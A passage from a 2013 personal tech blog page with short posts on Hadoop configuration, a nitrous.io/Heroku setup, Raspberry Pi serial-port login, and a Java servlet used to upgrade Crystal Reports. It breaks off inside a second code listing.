<h2 id="mapred-site-xml"><a href="#mapred-site-xml" class="headerlink" title="mapred-site.xml"></a>mapred-site.xml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"> &lt;property&gt;</span><br><span class="line">   &lt;name&gt;mapred.job.tracker&lt;/name&gt;</span><br><span class="line">   &lt;value&gt;localhost:9001&lt;/value&gt;</span><br><span class="line"> &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p><em>hadoop.tmp.dir</em> must be set, or it will throw error</p>
<h2 id="admin-interface"><a href="#admin-interface" class="headerlink" title="admin interface"></a>admin interface</h2><ul>
<li><a target="_blank" rel="noopener" href="http://localhost:50030/">http://localhost:50030/</a> Hadoop 管理介面 </li>
<li><a target="_blank" rel="noopener" href="http://localhost:50060/">http://localhost:50060/</a> Hadoop Task Tracker 状态</li>
<li><a target="_blank" rel="noopener" href="http://localhost:50070/">http://localhost:50070/</a> Hadoop DFS 状态</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://angelosun.iteye.com/blog/1844780">angelosun.iteye.com</a><br><a target="_blank" rel="noopener" href="http://shaurong.blogspot.hk/2013/07/hadoop-112-centos-64-x64.html">shaurong.blogspot.hk</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/zwkwd/article/details/11740589">blog.csdn.net</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-nitrous.io初探" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-10-10T08:22:40.000Z"><a href="/2013/10/10/nitrous.io%E5%88%9D%E6%8E%A2/">2013-10-10</a></time>
      
      
  
    <h1 class="title"><a href="/2013/10/10/nitrous.io%E5%88%9D%E6%8E%A2/">nitrous.io初探</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="1-Register-account"><a href="#1-Register-account" class="headerlink" title="1. Register account"></a>1. Register account</h1><p>  register git<br>  register heroku<br>  register mongolab<br>  create a workspace of nodejs</p>
<h1 id="2-Download-package"><a href="#2-Download-package" class="headerlink" title="2. Download package"></a>2. Download package</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apache-maven-3.1.0-bin.tar.gz</span><br><span class="line">hadoop-1.2.1-bin.tar.gz</span><br><span class="line">Dropbox-Uploader</span><br><span class="line">lynx2.8.7.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br><span class="line">npm install express -g </span><br><span class="line">npm install grunt-cli -g </span><br><span class="line">npm install grunt-init -g </span><br><span class="line">npm install socket.io </span><br><span class="line">npm install forever -g </span><br><span class="line">npm install coffee-script -g </span><br><span class="line">npm install nodemon -g</span><br></pre></td></tr></table></figure>

<h1 id="3-heroku"><a href="#3-heroku" class="headerlink" title="3. heroku"></a>3. heroku</h1><p><code>heroku login</code><br><code>heroku create</code></p>
<p> run <code>java -cp target/classes:target/dependency/* hello.App</code><br> in nitrous then preview <a target="_blank" rel="noopener" href="http://my-awesome-box-30153.apne1.nitrousbox.com/">http://my-awesome-box-30153.apne1.nitrousbox.com/</a><br> <code>git commit -a &amp;&amp; git push heroku master</code> then preivew <a target="_blank" rel="noopener" href="http://agile-thicket-5152.herokuapp.com/">http://agile-thicket-5152.herokuapp.com/</a> </p>
<p><a target="_blank" rel="noopener" href="https://devcenter.heroku.com/articles/getting-started-with-java">getting-started-with-java</a><br><a target="_blank" rel="noopener" href="https://devcenter.heroku.com/articles/create-a-java-web-application-using-embedded-tomcat">create-a-java-web-application-using-embedded-tomcat</a><br><a target="_blank" rel="noopener" href="https://devcenter.heroku.com/articles/war-deployment">war-deployment</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-login-RPi-via-serial-port" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-09-18T05:49:00.000Z"><a href="/2013/09/18/login-RPi-via-serial-port/">2013-09-18</a></time>
      
      
  
    <h1 class="title"><a href="/2013/09/18/login-RPi-via-serial-port/">login RPi via serial port</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>Since I have bought a <a target="_blank" rel="noopener" href="https://www.adafruit.com/products/954">product</a> from adafruit, I need to know how to connect my RPi from PC via serial port.</p>
<h1 id="Login-via-Serial-port"><a href="#Login-via-Serial-port" class="headerlink" title="Login via Serial port"></a>Login via Serial port</h1><p>By default, RPi can be login via serial port due to program getty is running configured in &#x2F;etc&#x2F;inittab</p>
<h1 id="Bootup-info"><a href="#Bootup-info" class="headerlink" title="Bootup info"></a>Bootup info</h1><p>When RPi boots up, it would send boot info to serial port since the file &#x2F;boot&#x2F;cmdline.txt.</p>
<h1 id="Disable-serial-port-when-boots-up"><a href="#Disable-serial-port-when-boots-up" class="headerlink" title="Disable serial port when boots up"></a>Disable serial port when boots up</h1><ul>
<li>add # character to the begining in file &#x2F;etc&#x2F;inittab<br><code>T0:23:respawn:/sbin/getty -L ttyAMA0 115200 vt100 </code></li>
<li>Remove all reference to ttyAMA0 in file &#x2F;boot&#x2F;cmdline.txt<br>From <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dwc_otg.lpm_enable=0 console=ttyAMA0,115200 kgdboc=ttyAMA0,115200 console=tty1 root=/dev/mmcblk0p2 </span><br><span class="line">rootfstype=ext4 elevator=deadline rootwait` </span><br></pre></td></tr></table></figure>
To<br><code>dwc_otg.lpm_enable=0 console=tty1 root=/dev/mmcblk0p2 rootfstype=ext4 elevator=deadline rootwait</code></li>
</ul>
<h1 id="Reboot"><a href="#Reboot" class="headerlink" title="Reboot"></a>Reboot</h1><p><code>sudo reboot</code></p>
<h1 id="Test-the-serial-port"><a href="#Test-the-serial-port" class="headerlink" title="Test the serial port"></a>Test the serial port</h1><ul>
<li><code>stty -F /dev/ttyAMA0 9600</code></li>
<li><code>minicom -b 9600 -o -D /dev/ttyAMA0</code></li>
<li>python serial<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ser = serial.Serial(&quot;/dev/ttyAMA0&quot;,9600)</span><br><span class="line">ser.open()</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://www.hobbytronics.co.uk/raspberry-pi-serial-port">Raspberry Pi and the Serial Port</a><br><a target="_blank" rel="noopener" href="http://raspberrypi.stackexchange.com/questions/5036/what-application-and-options-should-i-use-to-get-terminal-access-to-my-pi-over">get terminal access to Pi over USB&#x2F;serial cable</a></a><br><a target="_blank" rel="noopener" href="http://elinux.org/RPi_Serial_Connection">RPi_Serial_Connection</a><br><a target="_blank" rel="noopener" href="http://blog.oscarliang.net/raspberry-pi-and-arduino-connected-serial-gpio">raspberry-pi-and-arduino-connected-serial-gpio</a><br><a target="_blank" rel="noopener" href="http://codeandlife.com/2012/07/01/raspberry-pi-serial-console-with-max3232cpe/">Raspberry Pi Serial Console With MAX3232CPE</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-升级Crystal-Report-8.5-to-Crystal-Report-2011" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-08-27T09:34:42.000Z"><a href="/2013/08/27/%E5%8D%87%E7%BA%A7Crystal-Report-8.5-to-Crystal-Report-2011/">2013-08-27</a></time>
      
      
  
    <h1 class="title"><a href="/2013/08/27/%E5%8D%87%E7%BA%A7Crystal-Report-8.5-to-Crystal-Report-2011/">升级Crystal Report 8.5 to Crystal Report 2011</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>升级过程中有两点需要注意：</p>
<ul>
<li>在AIX安装字体，繁体就用新细明体mingliu.ttf和mingliub.ttf(粗体)，英文就用Times New Roman：times.ttf，timesbd.ttf，timesbi.ttf，timesi.ttf。 </li>
<li>设置Locale，因不知为何在AIX上生成的PDF文件编码总是日文语系的，当设置完Locale后问题才得以解决，reportClientDoc.setLocale(Locale.TRADITIONAL_CHINESE); </li>
<li>运行时动态改变datasource的jndi，在oralce上尝试几个方法都失败，但感觉这些code都应该有参考价值的，也会列出来。</li>
</ul>
<h1 id="ReportServlet"><a href="#ReportServlet" class="headerlink" title="ReportServlet"></a>ReportServlet</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">package dh.report;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Calendar;</span><br><span class="line">import java.util.Collections;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Locale;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.regex.Matcher;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line">import javax.servlet.ServletConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import com.crystaldecisions.report.web.viewer.CrPrintMode;</span><br><span class="line">import com.crystaldecisions.report.web.viewer.CrystalReportViewer;</span><br><span class="line">import com.crystaldecisions.report.web.viewer.ReportExportControl;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.application.ISubreportClientDocument;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.application.ReportClientDocument;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.Fields;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ParameterField;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ParameterFieldDiscreteValue;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.exportoptions.ExportOptions;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.exportoptions.ReportExportFormat;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.IStrings;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.ReportSDKException;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.ReportSDKExceptionBase;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.reportsource.IReportSource;</span><br><span class="line"></span><br><span class="line">public class ReportServlet extends HttpServlet &#123; </span><br><span class="line"></span><br><span class="line">  public static String JNDI_NAME = &quot;java:comp/env/jdbc/psuat&quot;;</span><br><span class="line"></span><br><span class="line">  //public static String JNDI_NAME = &quot;jdbc/dhprd&quot;;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="line">      String fontsPath = config.getServletContext().getRealPath(&quot;/&quot;) + &quot;/WEB-INF/lib/fonts/&quot;;</span><br><span class="line">      System.out.println(&quot;real path &quot; + fontsPath);</span><br><span class="line">      try &#123;</span><br><span class="line">          /*GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;mingliu.ttf&quot;)));</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;mingliub.ttf&quot;)));</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;times.ttf&quot;)));</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;timesbd.ttf&quot;)));</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;timesbi.ttf&quot;)));</span><br><span class="line">          ge.registerFont(Font.createFont(Font.TRUETYPE_FONT, new File(fontsPath + &quot;timesi.ttf&quot;)));</span><br><span class="line"></span><br><span class="line">          String fonts[] = GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames();</span><br><span class="line"></span><br><span class="line">          for (int i = 0; i &lt; fonts.length; i++) &#123;</span><br><span class="line">              System.out.println(&quot;System font &quot; + fonts[i]);</span><br><span class="line">          &#125;*/</span><br><span class="line"></span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">      doGet(req, resp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">      String report = req.getParameter(&quot;report&quot;);</span><br><span class="line">      if (report != null) &#123;</span><br><span class="line">          report = report.replace(&quot;file:&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">          if (&quot;127.0.0.1&quot;.equals(req.getLocalAddr()) || &quot;10.13.135.40&quot;.equals(req.getLocalAddr())) &#123;</span><br><span class="line">              report = report.replace(&quot;/piers/apps/uat/installedApps/DHApps.ear/dh.war/rpt&quot;, &quot;&quot;);</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">              if (report.indexOf(&quot;uat&quot;) != -1) &#123;</span><br><span class="line">                  report = report.replace(&quot;/piers/apps/uat&quot;, &quot;/dh/apps/prod&quot;);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //      List&lt;String&gt; promptValues = retrieveParameterValues(req);</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;report = &quot; + report);</span><br><span class="line"></span><br><span class="line">      ReportClientDocument reportClientDoc = new ReportClientDocument();</span><br><span class="line"></span><br><span class="line">      Map parameterMap = new HashMap();</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          reportClientDoc.setLocale(Locale.TRADITIONAL_CHINESE);</span><br><span class="line"></span><br><span class="line">          reportClientDoc.open(report, 0);</span><br><span class="line"></span><br><span class="line">          ReportUtil.switch_tables(reportClientDoc.getDatabaseController());</span><br><span class="line"></span><br><span class="line">          //Perform the same operation against all tables in the subreport as well.</span><br><span class="line">          IStrings subreportNames = reportClientDoc.getSubreportController().getSubreportNames();</span><br><span class="line"></span><br><span class="line">          //Set the datasource for all the subreports.</span><br><span class="line">          for (int i = 0; i &lt; subreportNames.size(); i++) &#123;</span><br><span class="line">              ISubreportClientDocument subreportClientDoc = reportClientDoc.getSubreportController().getSubreport(</span><br><span class="line">                      subreportNames.getString(i));</span><br><span class="line"></span><br><span class="line">              //Switch tables for each subreport in the report using the same connection information.  See utility</span><br><span class="line">              //method below.</span><br><span class="line">              ReportUtil.switch_tables(subreportClientDoc.getDatabaseController());</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          Fields paraFields = reportClientDoc.getDataDefinition().getParameterFields();</span><br><span class="line"></span><br><span class="line">          for (int i = 0; i &lt; paraFields.size(); i++) &#123;</span><br><span class="line">              String value = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">              // get pre-set value</span><br><span class="line">              ParameterField field = (ParameterField) paraFields.get(i);</span><br><span class="line">              if (field.getValues() != null &amp;&amp; field.getValues().size() &gt; 0) &#123;</span><br><span class="line">                  ParameterFieldDiscreteValue v = (ParameterFieldDiscreteValue) field.getValues().get(0);</span><br><span class="line">                  value = v.getValue().toString();</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              String paramValue = req.getParameter(&quot;prompt&quot; + i);</span><br><span class="line">              System.out.println(&quot;paramValue = &quot; + paramValue);</span><br><span class="line">              if (paramValue != null) &#123;</span><br><span class="line">                  value = paramValue;</span><br><span class="line">                  if (value.indexOf(&quot;Date&quot;) != -1) &#123;</span><br><span class="line">                      parameterMap.put(field.getName(), getDate(value));</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                      parameterMap.put(field.getName(), value);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                  parameterMap.put(field.getName(), value);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          Fields fields = ReportUtil.prepareParameter(report, parameterMap);</span><br><span class="line"></span><br><span class="line">          IReportSource reportSource = reportClientDoc.getReportSource();</span><br><span class="line"></span><br><span class="line">          showByPdf(reportSource, fields, req, resp);</span><br><span class="line">      &#125; catch (ReportSDKException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; catch (ReportSDKExceptionBase e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void showByPdf(IReportSource reportSource, Fields fields, HttpServletRequest req, HttpServletResponse resp)</span><br><span class="line">          throws ReportSDKExceptionBase &#123;</span><br><span class="line">      ExportOptions exportOptions = new ExportOptions();</span><br><span class="line">      exportOptions.setExportFormatType(ReportExportFormat.PDF);</span><br><span class="line"></span><br><span class="line">      ReportExportControl exportControl = new ReportExportControl();</span><br><span class="line">      exportControl.setReportSource(reportSource);</span><br><span class="line">      exportControl.setExportOptions(exportOptions);</span><br><span class="line">      exportControl.setExportAsAttachment(false);</span><br><span class="line">      exportControl.setParameterFields(fields);</span><br><span class="line">      exportControl.setOwnPage(true);</span><br><span class="line"></span><br><span class="line">      exportControl.processHttpRequest(req, resp, req.getSession().getServletContext(), null);</span><br><span class="line"></span><br><span class="line">      exportControl.dispose();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void showByHtml(IReportSource reportSource, Fields fields, HttpServletRequest req, HttpServletResponse resp)</span><br><span class="line">          throws ReportSDKExceptionBase, IOException &#123;</span><br><span class="line">      //JPEReportSourceFactory rptSrcFactory = new JPEReportSourceFactory();</span><br><span class="line">      //Object reportSource =rptSrcFactory.createReportSource(report,Locale.TRADITIONAL_CHINESE);</span><br><span class="line">      CrystalReportViewer viewer = new CrystalReportViewer();</span><br><span class="line"></span><br><span class="line">      viewer.setReportSource(reportSource);</span><br><span class="line">      viewer.setPrintMode(CrPrintMode.ACTIVEX);</span><br><span class="line">      viewer.setParameterFields(fields);</span><br><span class="line">      viewer.setOwnPage(true);</span><br><span class="line">      String html = viewer.getHtmlContent(req, resp, getServletContext());</span><br><span class="line">      System.out.println(&quot;html = &quot; + html);</span><br><span class="line"></span><br><span class="line">      resp.setHeader(&quot;Cache-Control&quot;, &quot;no-cache, post-check=0, pre-check=0&quot;);</span><br><span class="line">      resp.setContentType(&quot;text/html&quot;);</span><br><span class="line">      resp.setCharacterEncoding(&quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">      viewer.processHttpRequest(req, resp, req.getSession().getServletContext(), resp.getWriter());</span><br><span class="line">      viewer.dispose();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private List&lt;String&gt; retrieveParameterValues(HttpServletRequest req) &#123;</span><br><span class="line">      List&lt;String&gt; parameterValues = new ArrayList&lt;String&gt;();</span><br><span class="line">      Enumeration&lt;String&gt; e = req.getParameterNames();</span><br><span class="line">      List&lt;String&gt; paraNames = new ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">      while (e.hasMoreElements()) &#123;</span><br><span class="line">          String paramName = e.nextElement();</span><br><span class="line">          paraNames.add(paramName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Collections.sort(paraNames);</span><br><span class="line">      for (String paramName : paraNames) &#123;</span><br><span class="line">          String paramValue = req.getParameter(paramName);</span><br><span class="line"></span><br><span class="line">          System.out.println(&quot;paramName = &quot; + paramName + &quot;, paramValue = &quot; + paramValue);</span><br><span class="line">          if (paramName.startsWith(&quot;prompt&quot;)) &#123;</span><br><span class="line">              System.out.println(&quot;prompt = &quot; + paramValue);</span><br><span class="line">              parameterValues.add(paramValue);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return parameterValues;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private Date getDate(String date) &#123;</span><br><span class="line">      Calendar c = Calendar.getInstance();</span><br><span class="line">      Pattern p = Pattern.compile(&quot;Date\\((\\d+),(\\d+),(\\d+)\\)&quot;);</span><br><span class="line">      Matcher m = p.matcher(date);</span><br><span class="line">      if (m.matches()) &#123;</span><br><span class="line">          System.out.println(&quot;year &quot; + m.group(1) + &quot;,month &quot; + m.group(2) + &quot;, date &quot; + m.group(3));</span><br><span class="line">          c.set(Calendar.YEAR, Integer.parseInt(m.group(1)));</span><br><span class="line">          c.set(Calendar.MONTH, Integer.parseInt(m.group(2)));</span><br><span class="line">          c.set(Calendar.DAY_OF_MONTH, Integer.parseInt(m.group(3)));</span><br><span class="line">      &#125;</span><br><span class="line">      return c.getTime();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ReportUtil"><a href="#ReportUtil" class="headerlink" title="ReportUtil"></a>ReportUtil</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 